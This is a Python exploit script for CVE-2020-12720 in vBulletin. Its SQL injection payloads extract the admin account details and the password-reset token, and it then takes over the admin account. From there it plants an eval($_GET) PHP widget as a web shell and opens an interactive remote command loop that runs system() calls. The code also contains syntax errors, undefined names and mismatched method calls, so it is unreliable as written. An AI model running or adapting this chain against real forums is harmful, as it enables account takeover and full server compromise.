#!/usr/bin/env python3
import requests
import sys
from random import randint
from log_colors import *

# CVE-2020-12720
# exploit
# exp = CVE2020_12720("http://localhost/vbullentin")
# 1. exp.is_vulnerable()
# 2. exp.get_table_prefix()
# 3. exp.get_admin_details()
# 4. ...
# reset admin password and got shell
class CVE2020_12720:
    headers = {'X-Requested-With' : 'XMLHttpRequest'}

    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
    
    # check if host is vulnerable or not
    def is_vulnerable(self):
        sqli = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
        '"vbulletinrcepoc",8,7,6,5,4,3,2,1;-- -'
        data = {'nodeId[nodeid]' : sqli})
        r = self.session.post(
                self.url + '/ajax/api/content_infraction/getIndexableContent', 
                headers = self.headers,
                data = data,
                verify = False
                )
        if 'vbulletinrcepoc' in r.text:
            print (LogColors.GREEN + f'host {url} is up and vulnerable' + LogColors.ENDC)
            return True
        return False

    # get table prefix
    def get_table_prefix(self):
        sqli = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
        'table_name,8,7,6,5,4,3,2,1 from information_schema.columns' + 
        ' WHERE column_name=\'phrasegroup_cppermission\';-- -'
        data = {'nodeId[nodeid]' : sqli}
        r = self.session.post(
                self.url + '/ajax/api/content_infraction/getIndexableContent', 
                headers = self.headers,
                data = data,
                verify = False
                )
        table_prefix = r.json()['rawtext'].split('language')[0]
        print(LogColors.YELLOW + 'table prefix ' + table_prefix + LogColors.ENDC)
        self.table_prefix = table_prefix

    # get admin details
    def get_admin_details(self):
        sqli = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
        'concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1' +
        'from ' + self.table_prefix + 'user where usergroupid=6;-- -'
        data = {"nodeId[nodeid]" : sqli}
        r = self.session.post(
                self.url + '/ajax/api/content_infraction/getIndexableContent',
                headers = self.headers,
                data = data,
                verify = False,
                )

        admin_user,admin_id,admin_email,admin_token = r.json()['rawtext'].split('|')
        print(LogColors.YELLOW + 'admin original token: ' + admin_token + LogColors.ENDC)
        self.admin_user = admin_user
        self.admin_id = admin_id
        self.admin_email = admin_email
        self.admin_orig_token = admin_token

    # request captcha hash
    def request_captcha_hash(self):
        r = self.session.post(
                self.url + '/ajax/api/hv/generateToken?',
                data = {'securitytoken':'guest'},
                headers = self.headers
                )
        captcha_hash = r.json()['hash']
        r = self.session.get(self.url + '/hv/image?hash=' + captcha_hash)
        self.captcha_hash = captcha_hash
    
    # get captcha
    def get_captcha(self):
        sqli_limit = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
            'count(answer),8,7,6,5,4,3,2,1 from ' + self.table_prefix + 'humanverify limit 0,1-- -'
        data = {"nodeId[nodeid]" : sqli_limit}
        # request for get limit
        r_limit = self.session.post(
                self.url + '/ajax/api/content_infraction/getIndexableContent',
                headers = self.headers,
                data = data,
                verify = False,
                )

        sqli_captcha = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
            '(answer),8,7,6,5,4,3,2,1 from ' + self.table_prefix + 'humanverify limit ' + 
            str(int(r.json()['rawtext']) - 1) + ',1-- -'
        data = {"nodeId[nodeid]" : sqli_captcha}
        # request for get captcha
        r = self.session.post(
                self.url + '/ajax/api/content_infraction/getIndexableContent',
                headers = self.headers,
                data = data,
                verify = False,
                )
        self.captcha = r.json()['rawtext']
        print(LogColors.YELLOW'captcha ' + self.captcha + LogColors.ENDC)
    
    # reset admin password
    def is_reset_admin_password(self):
        data = {
            'email' : self.admin_email,
            'humanverify[input]' : self.captcha,
            'humanverify[hash]' : self.captcha_hash,
            'securitytoken' : 'guest'
            }
        r = self.session.post(
            self.url + '/auth/lostpw',
            data = data,
            headers = self.headers,
            verify = False
            )
        if not r.json()['response']==None:
            print(LogColors.RED + 'reset password failed' + LogColors.ENDC)
            return False
        return True

    # retrieve reset token from database (captcha)
    def retrieve_reset_token(self):
        print (LogColors.BLUE + 'retrieve reset token....' + LogColors.ENDC)
        sqli = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
        'activationid,8,7,6,5,4,3,2,1 from ' + 
        table_prefix + 'useractivation WHERE userid = ' + 
        self.admin_id + ' limit 0,1-- -'
        data = {"nodeId[nodeid]" : sqli}
        r = self.session.post(
            self.url + '/ajax/api/content_infraction/getIndexableContent',
            data = data,
            headers = self.headers,
            verify = False,
            )
        self.token = r.json()["rawtext"]
    
    # reset admin password
    def reset_admin_password(self, new_password):
        print (self.YELLOW + 'resetting password....' + self.ENDC)
        data = {
            "userid" : self.admin_id,
            "activationid" : self.token,
            "new-password" : new_password,
            "new-password-confirm" : new_password,
            "securitytoken" : "guest",
            }
        r = self.session.post(
            self.url + '/auth/reset-password',
            data = data,
            headers = self.headers,
            verify = False
        )
        if not 'Logging in' in r.text:
            print (LogColors.RED + 'fail reset admin password :(' + LogColors.ENDC)
        print (LogColors.GREEN + 'new admin credentials: ' + admin_user + ':' + new_password + LogColors.ENDC)
        self.admin_password = new_password

    # login with new admin password
    def login(self):
        data={'username' : self.admin_user, 'password': self.admin_password, 'securitytoken':'guest'}
        r = self.session.post(
            self.url + '/auth/ajax-login', 
            data = data,
            headers = self.headers,
            verify = False,
            )
        self.token = r.json()['newtoken']
        print (LogColors.GREEN + "successfully login with new admin creds" + LogColors.ENDC)

    # activate site builder
    def activate_sitebuilder(self):
        data = {
            'pageid':'1',
            'nodeid':'0',
            'userid':'1',
            'loadMenu':'alse',
            'isAjaxTemplateRender':'true',
            'isAjaxTemplateRenderWithData':'true',
            'securitytoken' : self.token
            }
        r = self.session.post(
            self.url + '/ajax/activate-sitebuilder',
            data = data,
            headers = self.headers,
            verify = False,
            )
        print (self.YELLOW + 'successfully actiate sitebuilder...' + self.ENDC)

    # cplogin
    def cplogin(self):
        data={'logintype':'cplogin','userid' : self.admin_id, 'password' : self.admin_password, 'securitytoken' : self.token}
        r = self.session.post(
            self.url + '/auth/ajax-login',
            data = data,
            headers = self.headers,
            verify = False,
            )
        print (LogColors.YELLOW + 'successfully login with logintype cplogin...' + LogColors.ENDC)

    # save widget
    def save_widget(self):
        data={
            'containerinstanceid' : '0',
            'widgetid' : '23',
            'pagetemplateid' : '',
            'securitytoken' : self.token
            }
        r = self.sesion.post(
            self.url + '/ajax/api/widget/saveNewWidgetInstance',
            data = data, headers = self.headers, verify = False,
            )
        widget_instance_id, page_template_id= r.json()['widgetinstanceid'], r.json()['pagetemplateid']
        
        # save admin config
        data = {
            'widgetid' : '23', 
            'pagetemplateid' : page_template_id, 'widgetinstanceid' : widget_instance_id,
            'data[widget_type]' : '',
            'data[title]' : 'Unconfigured+PHP+Module',
            'data[show_at_breakpoints][desktop]' : '1',
            'data[show_at_breakpoints][small]' : '1',
            'data[show_at_breakpoints][xsmall]' : '1',
            'data[hide_title]':'0',
            'data[module_viewpermissions][key]' : 'show_all',
            'data[code]' : 'eval($_GET["e"]);',
            'securitytoken' : self.token
            }

        r = self.session.post(
            self.url + '/ajax/api/widget/saveAdminConfig',
            data = data, headers = self.headers, verify = False,
            )
        self.widget_instance_id, self.page_template_id = widget_instance_id, page_template_id

    # save shell
    def save_shell(self):
        print (LogColors.BLUE + "saving shell..." + LogColors.ENDC)
        myshell = 'myshell' + str(randint(10, 100))
        data = {
            'input[ishomeroute]' : '0',
            'input[pageid]' : '0',
            'input[nodeid]' : '0',
            'input[userid]' : self.admin_id,
            'input[screenlayoutid]' : '2',
            'input[templatetitle]' : myshell,
            'input[displaysections[0]]' : '[]',
            'input[displaysections[1]]' : '[]',
            'input[displaysections[2]]' : '[{"widgetId":"23","widgetInstanceId":"' + str(widgetinstanceid) + '"}]',
            'input[displaysections[3]]' : '[]',
            'input[pagetitle]' : myshell,
            'input[resturl]' : myshell,
            'input[metadescription]' : 'vBulletin Forums',
            'input[pagetemplateid]' : self.page_template_id,
            'url' : self.url,
            'securitytoken' : self.token,
            }
        r = self.session.post(
            self.url + "/admin/savepage",
            data = data, headers = self.headers, verify = False,
            )

        r = self.session.get(
            self.url + '/' + myshell + '?e=echo \'hacked by cocomelonc!\';',
            headers = self.headers, verify = False
            )
        if 'hacked by cocomelonc!' in r.text:
            print (LogColors.GREEN + 'got shell, hacked :)' + LogColors.ENDC)
        while True:
            cmd = input('> ')
            r = self.get(
                self.url + '/' + myshell + '?e=system(\'' + cmd + '\');',
                headers = self.headers, verify = False
                )
            print (r.text.split('<div class="widget-content">')[1].split('</div>')[0].strip().rstrip())

if __name__ == '__main__':
    cve = CVE2020_12720("http://localhost/vbullentin")
    if cve.is_vulnerable():
        cve.get_table_prefix()
        cve.get_admin_details()
        cve.request_captcha_hash()
        cve.get_captcha()
        if cve.is_reset_admin_password():
            cve.retrieve_request_token()
            cve.reset_admin_password()
            cve.login()
            cve.activate_sitebuilder()
            cve.cplogin()
            cve.save_widget()
            cve.save_shell()
